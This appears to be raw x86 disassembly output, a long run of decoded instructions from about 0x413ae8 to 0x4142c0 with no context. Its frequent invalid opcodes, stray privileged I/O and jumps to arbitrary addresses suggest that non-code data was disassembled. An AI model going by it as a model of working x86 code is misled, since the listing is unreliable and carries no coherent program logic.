  413ae8:	in     eax,0x24
  413aea:	sub    DWORD PTR [ebx-0x4e75d9f2],edx
  413af0:	mov    ch,0x63
  413af2:	mov    ecx,0x28cb5781
  413af7:	inc    esp
  413af8:	retf   
  413af9:	ja     0x413b72
  413afb:	dec    esp
  413afc:	jo     0x413b5c
  413afe:	imul   esp,DWORD PTR [eax+0x396d6537],0xffffffef
  413b05:	jg     0x413b63
  413b07:	sbb    DWORD PTR [eax],ebp
  413b09:	stos   DWORD PTR es:[edi],eax
  413b0a:	sub    dh,BYTE PTR [edx+0x3229abda]
  413b10:	mov    WORD PTR [esp+edx*8+0x6a],?
  413b14:	or     ch,cl
  413b16:	mov    esp,DWORD PTR [esp+eiz*4-0xe]
  413b1a:	jns    0x413af9
  413b1c:	fneni(8087 only) 
  413b1e:	ins    DWORD PTR es:[edi],dx
  413b1f:	mov    bh,0x1a
  413b21:	lahf   
  413b22:	leave  
  413b23:	xor    al,0x71
  413b25:	dec    esp
  413b26:	xchg   esp,eax
  413b27:	lods   eax,DWORD PTR ds:[esi]
  413b28:	mov    al,BYTE PTR [esi+0x27e26843]
  413b2e:	int3   
  413b2f:	sbb    eax,0x7a39ffaf
  413b34:	ror    DWORD PTR [ecx],cl
  413b36:	adc    bh,bl
  413b38:	arpl   cx,ax
  413b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b3b:	pushf  
  413b3c:	xchg   edx,eax
  413b3d:	jb     0x413ac7
  413b3f:	loope  0x413b4a
  413b41:	(bad)  
  413b42:	mov    ebx,0x7a21cc91
  413b47:	out    0x5,eax
  413b49:	push   ecx
  413b4a:	lea    ebx,[ecx-0x1d]
  413b4d:	cld    
  413b4e:	es cwde 
  413b50:	mov    WORD PTR [ebx],?
  413b52:	es xor eax,0xaa33462b
  413b58:	add    BYTE PTR [ebp-0x1f],0xb5
  413b5c:	mov    esp,0x8caa95e5
  413b61:	dec    esp
  413b62:	stos   DWORD PTR es:[edi],eax
  413b63:	mov    bl,0x6f
  413b65:	cmp    al,0x1a
  413b67:	xchg   esi,eax
  413b68:	jl     0x413b0d
  413b6a:	icebp  
  413b6b:	addr16 or eax,eax
  413b6e:	outs   dx,BYTE PTR ds:[esi]
  413b6f:	nop
  413b70:	cmp    ebp,ebp
  413b72:	cli    
  413b73:	fstp   st(6)
  413b75:	push   esi
  413b76:	pop    esp
  413b77:	ds adc al,0x77
  413b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b7b:	test   ebx,edx
  413b7d:	fadd   DWORD PTR [edx+0x19ecc9a3]
  413b83:	add    al,0xa3
  413b85:	dec    esp
  413b86:	mov    esi,gs
  413b88:	and    dh,BYTE PTR [eax+0x35]
  413b8b:	std    
  413b8c:	jb     0x413b2d
  413b8e:	les    esi,FWORD PTR [edi+0x78b50fe]
  413b94:	pusha  
  413b95:	sub    BYTE PTR [eax+eax*2],cl
  413b98:	mov    esp,0xdac39ecc
  413b9d:	(bad)  
  413b9e:	jne    0x413bcc
  413ba0:	ins    BYTE PTR es:[edi],dx
  413ba1:	out    0xe5,eax
  413ba3:	jge    0x413b81
  413ba5:	test   BYTE PTR [esi+0xc],0x1e
  413ba9:	loopne 0x413c1d
  413bab:	ror    DWORD PTR [ecx],1
  413bad:	fisub  DWORD PTR [edi+esi*4-0x70]
  413bb1:	aas    
  413bb2:	mov    esi,0x8efb72b8
  413bb7:	imul   ebx,DWORD PTR [edx],0x598caf31
  413bbd:	jge    0x413be0
  413bbf:	popf   
  413bc0:	sub    BYTE PTR [eax-0x4a7e6d01],0x3e
  413bc7:	dec    edx
  413bc8:	or     eax,ecx
  413bca:	jge    0x413c12
  413bcc:	xor    al,0x69
  413bce:	jb     0x413c01
  413bd0:	xchg   esp,eax
  413bd1:	data16 jne 0x413b56
  413bd4:	mov    fs,WORD PTR [ebx+ebx*4-0x33]
  413bd8:	mov    al,0x59
  413bda:	inc    edi
  413bdb:	mov    esi,0xc1348a74
  413be0:	sti    
  413be1:	dec    esi
  413be2:	xchg   ebp,eax
  413be3:	fsub   QWORD PTR [esi+0x33e5719e]
  413be9:	popf   
  413bea:	or     al,BYTE PTR [esi+0x4b]
  413bed:	or     DWORD PTR [edx-0x61],edi
  413bf0:	cdq    
  413bf1:	jne    0x413c0d
  413bf3:	int3   
  413bf4:	cmp    ah,BYTE PTR [edi-0x3b]
  413bf7:	pushf  
  413bf8:	add    ah,dh
  413bfa:	into   
  413bfb:	std    
  413bfc:	xor    al,0xec
  413bfe:	stc    
  413bff:	adc    eax,0xfb9f3242
  413c04:	mov    DWORD PTR [edi],esi
  413c06:	pop    ebp
  413c07:	fcos   
  413c09:	xchg   ecx,eax
  413c0a:	cwde   
  413c0b:	cmc    
  413c0c:	jb     0x413b99
  413c0e:	in     al,dx
  413c0f:	or     ecx,DWORD PTR [eax+esi*1+0x71]
  413c13:	xchg   ecx,eax
  413c14:	lods   eax,DWORD PTR ds:[esi]
  413c15:	bound  ebp,QWORD PTR [eax]
  413c17:	loop   0x413c69
  413c19:	outs   dx,DWORD PTR ds:[esi]
  413c1a:	xchg   ecx,eax
  413c1b:	pop    esi
  413c1c:	push   0x5151d415
  413c21:	stos   BYTE PTR es:[edi],al
  413c22:	mov    al,0x66
  413c24:	mov    al,ds:0x82cd1731
  413c29:	sub    edx,edi
  413c2b:	(bad)  
  413c2c:	or     dl,cl
  413c2e:	aam    0xdc
  413c30:	xchg   DWORD PTR [esp+ecx*4-0x28],eax
  413c34:	xor    al,0xa4
  413c36:	inc    edi
  413c37:	mov    al,ds:0x94569c1f
  413c3c:	jno    0x413c3e
  413c3e:	ins    DWORD PTR es:[edi],dx
  413c3f:	test   al,0x71
  413c41:	cmp    esi,DWORD PTR [edi]
  413c43:	add    BYTE PTR [eax],ah
  413c45:	cld    
  413c46:	sbb    ecx,edi
  413c48:	(bad)  
  413c49:	shl    ah,1
  413c4b:	adc    BYTE PTR [eax],ch
  413c4d:	lahf   
  413c4e:	dec    ecx
  413c4f:	adc    eax,0xe00eafcf
  413c54:	sbb    al,0x2f
  413c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c58:	enter  0x61d,0x37
  413c5c:	leave  
  413c5d:	or     edx,ecx
  413c5f:	outs   dx,DWORD PTR ds:[esi]
  413c60:	mov    esi,0x527b2ebd
  413c65:	inc    edx
  413c66:	lahf   
  413c67:	int    0x60
  413c69:	mov    edx,0x68d1478d
  413c6e:	rcl    ebx,cl
  413c70:	mov    dl,0xa2
  413c72:	adc    dh,BYTE PTR [ebx+0x27a5697a]
  413c78:	inc    eax
  413c79:	mov    WORD PTR [ebx+0x179657d9],ds
  413c7f:	mov    edi,eax
  413c81:	mov    esi,edx
  413c83:	es loope 0x413ce7
  413c86:	pop    ebp
  413c87:	and    esi,DWORD PTR [edx-0x15efc56]
  413c8d:	or     bl,BYTE PTR [edx-0x6569684e]
  413c93:	test   eax,0x9633ba5f
  413c98:	cmp    ch,BYTE PTR [eax]
  413c9a:	sahf   
  413c9b:	dec    eax
  413c9c:	into   
  413c9d:	cmp    al,0x37
  413c9f:	mov    bl,ah
  413ca1:	fcomp  DWORD PTR [eax+0xde9b31]
  413ca7:	popa   
  413ca8:	(bad)  
  413ca9:	loop   0x413ca7
  413cab:	xor    al,cl
  413cad:	test   BYTE PTR [ecx-0x5e3ddff7],dl
  413cb3:	fucomp st(7)
  413cb5:	lea    ebp,[esp+ebp*2]
  413cb8:	leave  
  413cb9:	out    0x42,eax
  413cbb:	stc    
  413cbc:	jge    0x413cbb
  413cbe:	push   ecx
  413cbf:	test   al,0xa3
  413cc1:	icebp  
  413cc2:	inc    eax
  413cc3:	jle    0x413d42
  413cc5:	inc    edx
  413cc6:	push   cs
  413cc7:	nop
  413cc8:	(bad)  
  413cc9:	mov    ?,WORD PTR [ecx+0x7105d154]
  413ccf:	pop    ebx
  413cd0:	inc    ebp
  413cd1:	scas   eax,DWORD PTR es:[edi]
  413cd2:	loopne 0x413d38
  413cd4:	ins    DWORD PTR es:[edi],dx
  413cd5:	push   eax
  413cd6:	retf   0x8d8b
  413cd9:	xlat   BYTE PTR ds:[ebx]
  413cda:	sub    BYTE PTR [edx+0x72],ch
  413cdd:	xor    BYTE PTR [esi],bh
  413cdf:	les    eax,FWORD PTR [eax-0x12]
  413ce2:	lds    ebx,FWORD PTR [ebx+0x45d598d7]
  413ce8:	xchg   ebx,eax
  413ce9:	cs inc esi
  413ceb:	inc    esi
  413cec:	cmp    eax,0x4b6ec1ce
  413cf1:	fucomip st,st(0)
  413cf3:	jl     0x413c91
  413cf5:	xchg   ecx,eax
  413cf6:	retf   0xe4b5
  413cf9:	add    DWORD PTR [edi+edx*4-0x6e],esi
  413cfd:	mov    ch,0x75
  413cff:	mov    edx,esi
  413d01:	sbb    bl,BYTE PTR [edi+0x2fb287c1]
  413d07:	mov    eax,ds:0xb5591d78
  413d0c:	(bad)  
  413d0d:	(bad)  
  413d0e:	jecxz  0x413d33
  413d10:	in     eax,dx
  413d11:	pop    ecx
  413d12:	(bad)  
  413d13:	fst    QWORD PTR ds:0xdbbb7897
  413d19:	aad    0x38
  413d1b:	adc    eax,0x3c3c15a6
  413d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d21:	das    
  413d22:	pop    ebx
  413d23:	pusha  
  413d24:	xor    BYTE PTR [ebx],al
  413d26:	push   edx
  413d27:	xor    eax,0x386e6ff9
  413d2c:	and    DWORD PTR [ebx+0xa],edx
  413d2f:	leave  
  413d30:	lods   al,BYTE PTR cs:[esi]
  413d32:	adc    eax,0xf5bf62b8
  413d37:	fisubr WORD PTR [ebp-0x1d67deef]
  413d3d:	loopne 0x413d1c
  413d3f:	inc    edi
  413d40:	xor    cl,BYTE PTR [edi-0x1352d322]
  413d46:	mov    ecx,0x8afb22f2
  413d4b:	xchg   ebx,eax
  413d4c:	push   ecx
  413d4d:	xor    eax,esp
  413d4f:	mov    edx,0xdab9b88
  413d54:	in     eax,0xee
  413d56:	scas   eax,DWORD PTR es:[edi]
  413d57:	pop    edi
  413d58:	mov    bh,0x57
  413d5a:	pop    ebx
  413d5b:	jl     0x413d02
  413d5d:	pop    ebp
  413d5e:	mov    esi,0x465e847b
  413d63:	sbb    DWORD PTR [ecx-0x2e62d20c],edi
  413d69:	gs aad 0x39
  413d6c:	sub    eax,0x2dd19ad6
  413d71:	xchg   esi,eax
  413d72:	std    
  413d73:	push   0x83842a35
  413d78:	outs   dx,DWORD PTR ds:[esi]
  413d79:	cwde   
  413d7a:	mov    ecx,0x95f62cc3
  413d7f:	fmul   DWORD PTR [ecx]
  413d81:	in     al,0xf7
  413d83:	hlt    
  413d84:	clc    
  413d85:	xor    BYTE PTR [ecx],ch
  413d87:	mov    bh,dl
  413d89:	pop    esp
  413d8a:	sub    ch,BYTE PTR [ecx+0x6dcdc6c3]
  413d90:	or     eax,0x8162979b
  413d95:	mov    edx,0xe40ec6a3
  413d9a:	xor    al,0x84
  413d9c:	adc    ch,dh
  413d9e:	lahf   
  413d9f:	mov    dh,0x99
  413da1:	daa    
  413da2:	add    eax,0xcfdfa188
  413da7:	mov    al,ch
  413da9:	jno    0x413d5d
  413dab:	pop    ebp
  413dac:	imul   ebx,edi,0x7c9ce0d9
  413db2:	addr16 cld 
  413db4:	shl    edi,1
  413db6:	popa   
  413db7:	gs in  eax,dx
  413db9:	icebp  
  413dba:	(bad)  
  413dbb:	popf   
  413dbc:	pop    edx
  413dbd:	imul   DWORD PTR [ebx-0x32]
  413dc0:	mov    al,ds:0x28dae53
  413dc5:	mov    ebx,0xd0c82e9c
  413dca:	add    DWORD PTR [ecx],esp
  413dcc:	bound  edi,QWORD PTR [ecx]
  413dce:	xchg   esi,eax
  413dcf:	pop    edx
  413dd0:	out    dx,al
  413dd1:	add    edx,ebp
  413dd3:	jns    0x413d71
  413dd5:	pushf  
  413dd6:	rol    BYTE PTR fs:[esi+0x4b],cl
  413dda:	test   al,0xfd
  413ddc:	xchg   BYTE PTR [edi],bl
  413dde:	out    dx,eax
  413ddf:	mov    BYTE PTR [ecx-0x39],bh
  413de2:	cmp    BYTE PTR [edx-0x2e],ah
  413de5:	sub    BYTE PTR [ebp-0x2e],ch
  413de8:	je     0x413e5d
  413dea:	mov    ecx,0x66024afa
  413def:	out    0x5c,al
  413df1:	stos   DWORD PTR es:[edi],eax
  413df2:	repnz test BYTE PTR [ecx-0x6a],cl
  413df6:	xor    ah,dh
  413df8:	xor    ax,0x8e70
  413dfc:	push   ebx
  413dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dfe:	dec    ebx
  413dff:	scas   eax,DWORD PTR es:[edi]
  413e00:	fldcw  WORD PTR ds:0x3f725636
  413e06:	pop    edx
  413e07:	lods   eax,DWORD PTR ds:[esi]
  413e08:	outs   dx,BYTE PTR ds:[esi]
  413e09:	shl    DWORD PTR [esi],0x1c
  413e0c:	out    dx,al
  413e0d:	fst    QWORD PTR [edx+edx*2]
  413e10:	adc    BYTE PTR [ebp-0x3011abf0],bh
  413e16:	jmp    0x1adea80e
  413e1b:	mov    bh,0x23
  413e1d:	enter  0x31d1,0x9b
  413e21:	loop   0x413e20
  413e23:	fisttp WORD PTR [edi]
  413e25:	stos   DWORD PTR es:[edi],eax
  413e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e27:	xor    bx,WORD PTR [esi+0x54dc50e7]
  413e2e:	jmp    0x15be:0x513d95b7
  413e35:	popa   
  413e36:	push   ds
  413e37:	inc    ebx
  413e38:	jle    0x413eb9
  413e3a:	popf   
  413e3b:	pop    ecx
  413e3c:	loop   0x413e54
  413e3e:	bswap  eax
  413e40:	fisub  WORD PTR [ecx-0x3]
  413e43:	cwde   
  413e44:	adc    DWORD PTR [edx-0x1d3f245b],edi
  413e4a:	dec    ebx
  413e4b:	xchg   esp,eax
  413e4c:	ss sbb al,0x1b
  413e4f:	mov    ebx,0xa1802dd1
  413e54:	or     BYTE PTR [edi+0x14],ah
  413e57:	push   edx
  413e58:	add    eax,0x3b4f69d
  413e5d:	mov    bl,0x5e
  413e5f:	sbb    bh,BYTE PTR [eax+edi*1-0x38]
  413e63:	xlat   BYTE PTR ds:[ebx]
  413e64:	pop    ebx
  413e65:	mov    eax,ds:0xfebd5212
  413e6a:	sub    eax,0x76388ec5
  413e6f:	shl    eax,1
  413e71:	(bad)  
  413e72:	jge    0x413e03
  413e74:	sub    edi,DWORD PTR [ecx+edi*4+0x56e0508b]
  413e7b:	lock add BYTE PTR [esi-0x3d],cl
  413e7f:	test   eax,0x27faa809
  413e84:	fcomi  st,st(1)
  413e86:	call   0x3c509454
  413e8b:	push   esi
  413e8c:	in     al,0x2a
  413e8e:	ficomp DWORD PTR [edx]
  413e90:	inc    eax
  413e91:	mov    ebx,0x80c3ab2e
  413e96:	ds pop edx
  413e98:	in     al,0x17
  413e9a:	imul   edx,DWORD PTR [edx+eax*1],0xffffffe8
  413e9e:	test   eax,0xdf370b2b
  413ea3:	dec    ebx
  413ea4:	das    
  413ea5:	or     DWORD PTR ds:0x7c3ea9e0,0xd19e022
  413eaf:	push   edx
  413eb0:	mov    BYTE PTR [esi-0x18ffc600],cl
  413eb6:	sub    eax,0xd70741c2
  413ebb:	loope  0x413f19
  413ebd:	jge    0x413ebf
  413ebf:	push   ds
  413ec0:	mov    WORD PTR [esi+0x5d],es
  413ec3:	add    cl,BYTE PTR ds:[ebx]
  413ec6:	out    0x4e,eax
  413ec8:	adc    ecx,DWORD PTR [edi]
  413eca:	pop    ds
  413ecb:	push   ss
  413ecc:	gs dec esp
  413ece:	bound  esi,QWORD PTR [esi-0x4e5e5475]
  413ed4:	leave  
  413ed5:	shl    al,cl
  413ed7:	dec    esp
  413ed8:	mov    esp,0xfa34dd37
  413edd:	hlt    
  413ede:	add    bh,ch
  413ee0:	inc    edx
  413ee1:	or     edx,DWORD PTR [ecx]
  413ee3:	jge    0x413f45
  413ee5:	ins    DWORD PTR es:[edi],dx
  413ee6:	vcvttsd2si edx,QWORD PTR [edi]
  413eea:	dec    edi
  413eeb:	shl    dl,1
  413eed:	sub    ebp,ebx
  413eef:	lods   eax,DWORD PTR ds:[esi]
  413ef0:	sbb    BYTE PTR [esi-0x1a5729ef],bh
  413ef6:	cmpxchg DWORD PTR [ebp+0x32],edi
  413efa:	jo     0x413e9f
  413efc:	xor    al,0x25
  413efe:	leave  
  413eff:	mov    dh,0xe4
  413f01:	lock lods eax,DWORD PTR ds:[esi]
  413f03:	imul   ebx,ebx,0x385fa409
  413f09:	mov    ds:0x10c91beb,eax
  413f0e:	jge    0x413ece
  413f10:	add    BYTE PTR [ebx-0x5a70a11c],0x27
  413f17:	imul   ebx,DWORD PTR [eax+0x3230319e],0xb7c6604c
  413f21:	add    esi,DWORD PTR [eax]
  413f23:	xchg   edx,eax
  413f24:	shl    BYTE PTR fs:[esi],1
  413f27:	push   ss
  413f28:	pushw  ds
  413f2a:	dec    ebx
  413f2b:	into   
  413f2c:	cdq    
  413f2d:	repnz inc eax
  413f2f:	mov    ah,0x7e
  413f31:	test   eax,0xc6f25930
  413f36:	(bad)  
  413f37:	ds rol edx,cl
  413f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f3b:	daa    
  413f3c:	(bad)  
  413f3f:	into   
  413f40:	(bad)  
  413f42:	ret    0xbf86
  413f45:	cdq    
  413f46:	std    
  413f47:	jle    0x413f6d
  413f49:	xor    eax,0x6c866973
  413f4e:	jge    0x413f97
  413f50:	into   
  413f51:	jae    0x413f13
  413f53:	out    dx,eax
  413f54:	shl    DWORD PTR [esi+esi*8+0x71feddd6],0xf9
  413f5c:	xor    ebp,DWORD PTR [edx]
  413f5e:	inc    edx
  413f5f:	call   0xd32604ea
  413f64:	mov    ?,WORD PTR [ebx]
  413f66:	jmp    0xfd4d:0x89c3198b
  413f6d:	sbb    edi,DWORD PTR [edi+edx*8]
  413f70:	add    esp,DWORD PTR [ecx+0x40]
  413f73:	pop    edi
  413f74:	add    al,0xf
  413f76:	data16 mov ah,0x23
  413f79:	mov    ch,0xbf
  413f7b:	mov    esi,0x57284c6a
  413f80:	mov    ds:0x49ec7696,al
  413f85:	out    0xd5,eax
  413f87:	leave  
  413f88:	jmp    0x64403b3a
  413f8d:	push   edi
  413f8e:	cmp    DWORD PTR ss:[esi+0xd69bd5c],eax
  413f95:	push   edi
  413f96:	imul   eax,DWORD PTR [ebp-0x773bcc6],0xffffff98
  413f9d:	push   0xe1072e94
  413fa2:	(bad)  
  413fa3:	sti    
  413fa4:	and    DWORD PTR [edx-0x31be4813],eax
  413faa:	setne  BYTE PTR [ebp-0x4]
  413fae:	sub    eax,0xd87faa0b
  413fb3:	pop    edi
  413fb4:	mov    bh,0xce
  413fb6:	rcr    esi,0x6b
  413fb9:	dec    esp
  413fba:	xchg   ebp,eax
  413fbb:	pop    ebp
  413fbc:	std    
  413fbd:	xor    al,0xe
  413fbf:	and    eax,0xcecb7cfd
  413fc4:	sar    DWORD PTR ss:[edi],0x27
  413fc8:	adc    ebp,0xeaa767bf
  413fce:	rcr    eax,1
  413fd0:	loopne 0x413fbd
  413fd2:	shl    BYTE PTR [ebx+0x5e],1
  413fd5:	out    dx,eax
  413fd6:	sbb    DWORD PTR [eax],ebp
  413fd8:	pop    es
  413fd9:	iret   
  413fda:	clc    
  413fdb:	sbb    eax,ebx
  413fdd:	in     eax,dx
  413fde:	stos   BYTE PTR es:[edi],al
  413fdf:	fbld   TBYTE PTR [ebx-0x7a3e2d38]
  413fe5:	push   ss
  413fe6:	adc    ch,BYTE PTR [esi]
  413fe8:	pop    es
  413fe9:	or     eax,0x6b806052
  413fee:	idiv   eax
  413ff0:	mov    ds:0x4fd1012a,eax
  413ff5:	xor    ebx,0x18
  413ff8:	jl     0x413f91
  413ffa:	pop    ebp
  413ffb:	and    al,0xaf
  413ffd:	adc    BYTE PTR [esi+ebp*2+0x55],bh
  414001:	adc    al,0xf4
  414003:	sub    al,BYTE PTR ds:0x803ee256
  414009:	sbb    BYTE PTR [esi-0x1d5e6270],bl
  41400f:	mov    ebx,0xc9632e37
  414014:	lock or dl,BYTE PTR [ecx+eax*8]
  414018:	in     al,dx
  414019:	push   esp
  41401a:	pop    ebx
  41401b:	ret    
  41401c:	cmc    
  41401d:	pushf  
  41401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41401f:	jns    0x413fc4
  414021:	(bad)  
  414022:	lds    esp,FWORD PTR [ecx]
  414024:	mov    edi,DWORD PTR [ebx+0x182fe641]
  41402a:	pop    esi
  41402b:	mov    cl,0x39
  41402d:	mov    bx,cx
  414030:	fld    TBYTE PTR [ecx+eax*2]
  414033:	push   edi
  414034:	das    
  414035:	jp     0x414072
  414037:	in     al,0xb5
  414039:	loopne 0x413ff5
  41403b:	popf   
  41403c:	or     edx,DWORD PTR [esi+0x37a42dd5]
  414042:	loop   0x41403c
  414044:	stc    
  414045:	mov    dl,0x98
  414047:	xchg   edx,eax
  414048:	push   esp
  414049:	fcmovnbe st,st(4)
  41404b:	lods   al,BYTE PTR ds:[esi]
  41404c:	xchg   bl,bh
  41404e:	adc    DWORD PTR [ecx-0x707714d9],edx
  414054:	push   cs
  414055:	or     edi,DWORD PTR [esp+ebp*2+0x76aac057]
  41405c:	jecxz  0x414081
  41405e:	xor    ch,BYTE PTR [esi+0x1d0a5ccf]
  414064:	dec    eax
  414065:	xor    DWORD PTR [edx],0xfcad2004
  41406b:	js     0x4140cf
  41406d:	test   eax,0x381157ad
  414072:	popf   
  414073:	pop    esi
  414074:	push   edi
  414075:	pusha  
  414076:	adc    BYTE PTR ds:0x64d4930d,0x14
  41407d:	enter  0x76b4,0x68
  414081:	mov    al,BYTE PTR [edx-0x53c0b907]
  414087:	cwde   
  414088:	mov    edi,0xb3c5f441
  41408d:	pushf  
  41408e:	inc    ebp
  41408f:	mov    BYTE PTR [edx-0x2f7a3f76],ah
  414095:	(bad)  
  414096:	dec    esi
  414097:	cdq    
  414098:	sbb    al,BYTE PTR [ebx]
  41409a:	sub    ebp,DWORD PTR [edx-0x7e00ae40]
  4140a0:	mov    ds,WORD PTR ds:0x17526f2
  4140a6:	dec    edx
  4140a7:	imul   DWORD PTR [eax+0x76964c9e]
  4140ad:	call   0x74761560
  4140b2:	call   0x448299bf
  4140b7:	pusha  
  4140b8:	add    al,BYTE PTR [eax-0x2b3d7627]
  4140be:	mov    ecx,0xe769816f
  4140c3:	sub    al,0x72
  4140c5:	xor    DWORD PTR [ebp-0x7ca71d07],0x636d0f2a
  4140cf:	shl    dh,0xe3
  4140d2:	push   cs
  4140d3:	pusha  
  4140d4:	in     al,dx
  4140d5:	mov    al,ds:0x917b8f2
  4140da:	jne    0x4140fe
  4140dc:	ins    DWORD PTR es:[edi],dx
  4140dd:	aam    0x8e
  4140df:	dec    esp
  4140e0:	mov    al,ds:0xeb2cbc6b
  4140e5:	push   0x9aba37d4
  4140ea:	popa   
  4140eb:	push   es
  4140ec:	lahf   
  4140ed:	mov    ds:0xef7a7a3,al
  4140f2:	push   ds
  4140f3:	mul    DWORD PTR [edx]
  4140f5:	dec    eax
  4140f6:	jns    0x414151
  4140f8:	adc    DWORD PTR [esi+0x3a],edi
  4140fb:	inc    edx
  4140fc:	push   ss
  4140fd:	sar    DWORD PTR [ebp-0x1],1
  414100:	add    eax,0x835e1c8f
  414105:	xchg   esi,eax
  414106:	sub    eax,0x1d9f856b
  41410b:	adc    esi,ebx
  41410d:	mov    ecx,DWORD PTR [esi]
  41410f:	xchg   ebx,eax
  414110:	ret    0x46b0
  414113:	sbb    DWORD PTR [esi+0x11],edx
  414116:	cld    
  414117:	and    BYTE PTR [edx-0x65dafc82],bl
  41411d:	into   
  41411e:	imul   edx,DWORD PTR ds:0x1d393033,0x24
  414125:	retf   
  414126:	cmp    ebp,ecx
  414128:	aaa    
  414129:	popa   
  41412a:	xchg   ebp,eax
  41412b:	cwde   
  41412c:	xchg   BYTE PTR [edi-0x48],bh
  41412f:	and    DWORD PTR [edx-0xaf889bb],ebx
  414135:	jg     0x4140e8
  414137:	xchg   esp,eax
  414138:	or     BYTE PTR [ecx+0x7724d360],ch
  41413e:	ja     0x4140f6
  414140:	xor    DWORD PTR [ecx-0x7bdf1fa7],esp
  414146:	cmp    ah,BYTE PTR ds:0x9ac28d9b
  41414c:	xchg   edi,eax
  41414d:	inc    edx
  41414e:	mov    ch,0xb9
  414150:	enter  0x5efd,0xc9
  414154:	jmp    0x41417e
  414156:	iret   
  414157:	mov    ebx,0x47d4545e
  41415c:	rcr    DWORD PTR [ebx+ebx*1],cl
  41415f:	or     al,BYTE PTR [ecx+0x7]
  414162:	aaa    
  414163:	cwde   
  414164:	out    dx,eax
  414165:	ret    
  414166:	dec    ecx
  414167:	sub    eax,0x15c19e16
  41416c:	repnz test BYTE PTR [ebx],bh
  41416f:	cmp    al,0x74
  414171:	aas    
  414172:	pop    es
  414173:	or     edi,DWORD PTR [esi]
  414175:	dec    ebp
  414176:	lahf   
  414177:	sbb    al,0x92
  414179:	jmp    0x4141a5
  41417b:	jnp    0x414132
  41417d:	jmp    0x2d9ab43c
  414182:	mov    WORD PTR [ebx-0x158fe31c],fs
  414188:	ret    0xed8
  41418b:	pop    esi
  41418c:	imul   BYTE PTR [eax]
  41418e:	mov    bh,0x23
  414190:	mov    ebx,0x484287f0
  414195:	pop    ebp
  414196:	xlat   BYTE PTR ds:[ebx]
  414197:	js     0x414196
  414199:	jmp    0x1b7b:0xe777d85c
  4141a0:	and    BYTE PTR [ecx-0xe],bh
  4141a3:	mov    BYTE PTR [eax],bl
  4141a5:	dec    edi
  4141a6:	sub    BYTE PTR [esi-0xa55d333],bl
  4141ac:	enter  0xd8e1,0x6d
  4141b0:	sub    eax,0x4b4cb081
  4141b5:	ror    DWORD PTR [edx+edx*2+0x2],1
  4141b9:	mov    WORD PTR [ebx+ecx*1+0x65],ss
  4141bd:	inc    eax
  4141be:	cmp    dh,ah
  4141c0:	inc    ebx
  4141c1:	call   0x803040dc
  4141c6:	pop    esp
  4141c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c8:	aaa    
  4141c9:	imul   ebp
  4141cb:	data16 jl 0x41418d
  4141ce:	clc    
  4141cf:	mov    ch,0xe5
  4141d1:	xchg   ch,ch
  4141d3:	push   esp
  4141d4:	mov    ecx,DWORD PTR ds:0xd7dcb7c5
  4141da:	pop    ss
  4141db:	icebp  
  4141dc:	int    0x4f
  4141de:	dec    edi
  4141df:	(bad)  
  4141e0:	cmc    
  4141e1:	cwde   
  4141e2:	cld    
  4141e3:	mov    dh,0xd5
  4141e5:	out    0x8f,eax
  4141e7:	imul   esp,DWORD PTR es:[esi-0x32],0xb6344d27
  4141ef:	add    al,BYTE PTR [ebx-0x4]
  4141f2:	js     0x4141ef
  4141f4:	mov    eax,0x1ea7c267
  4141f9:	pop    edx
  4141fa:	jecxz  0x414269
  4141fc:	lds    eax,FWORD PTR [esi-0x116e2a26]
  414202:	aas    
  414203:	xor    eax,0xa0251326
  414208:	pop    es
  414209:	xchg   DWORD PTR [edi+ebp*1+0x78],esp
  41420d:	adc    cl,0xed
  414210:	cs in  al,0x1c
  414213:	aad    0x17
  414215:	xor    bl,BYTE PTR [ebx]
  414217:	cmp    ch,BYTE PTR [edi-0x5e]
  41421a:	jecxz  0x414268
  41421c:	ficom  WORD PTR [ecx+0x7c8b51e3]
  414222:	sub    al,BYTE PTR [esi]
  414224:	not    BYTE PTR [edi]
  414226:	test   DWORD PTR [edx],0x4b51565e
  41422c:	xor    eax,0x85014c8d
  414231:	sbb    esi,DWORD PTR [edx-0x56472527]
  414237:	mov    edx,0x269655fc
  41423c:	push   ss
  41423d:	ja     0x414216
  41423f:	pop    edi
  414240:	jno    0x41425a
  414242:	jl     0x41424f
  414244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414245:	leave  
  414246:	mov    dl,0xd8
  414248:	dec    edi
  414249:	xchg   DWORD PTR [edx+ecx*2],esi
  41424c:	daa    
  41424d:	mov    ch,BYTE PTR [edx+0x587960b7]
  414253:	repnz dec esp
  414255:	stc    
  414256:	call   0x7c910541
  41425b:	fldenv [edx-0x104848fe]
  414261:	leave  
  414262:	scas   al,BYTE PTR es:[edi]
  414263:	inc    esi
  414264:	sbb    al,0x9
  414266:	jne    0x4142a5
  414268:	mov    dl,BYTE PTR [ebx]
  41426a:	mov    edx,0x3623c44
  41426f:	jno    0x414249
  414271:	mov    bh,0xe0
  414273:	adc    cl,BYTE PTR [esi-0x66]
  414276:	sub    DWORD PTR ds:[esi],esp
  414279:	and    al,0x8b
  41427b:	dec    esi
  41427c:	je     0x41426d
  41427e:	push   0xad3c63c8
  414283:	pop    edi
  414284:	clc    
  414285:	mov    eax,DWORD PTR [edx]
  414287:	cmp    eax,0x922d84c3
  41428c:	mov    bh,BYTE PTR [esi+0x3344bcfd]
  414292:	retf   
  414293:	test   eax,0xff6faf39
  414298:	bound  esi,QWORD PTR [edx+0x71]
  41429b:	cmc    
  41429c:	sbb    eax,0x9a903fe9
  4142a1:	sti    
  4142a2:	cmp    esi,esp
  4142a4:	(bad)  
  4142a5:	je     0x41427a
  4142a7:	push   esp
  4142a8:	das    
  4142a9:	iret   
  4142aa:	dec    ecx
  4142ab:	xchg   BYTE PTR [edi-0x50],cl
  4142ae:	inc    ebp
  4142af:	das    
  4142b0:	ret    0xda4
  4142b3:	jmp    0x41426a
  4142b5:	aam    0x3b
  4142b7:	fisubr WORD PTR [ebp-0x79]
  4142ba:	fnsave [esi+0x5bf88221]
  4142c0:	lea    esp,[esi-0x22]
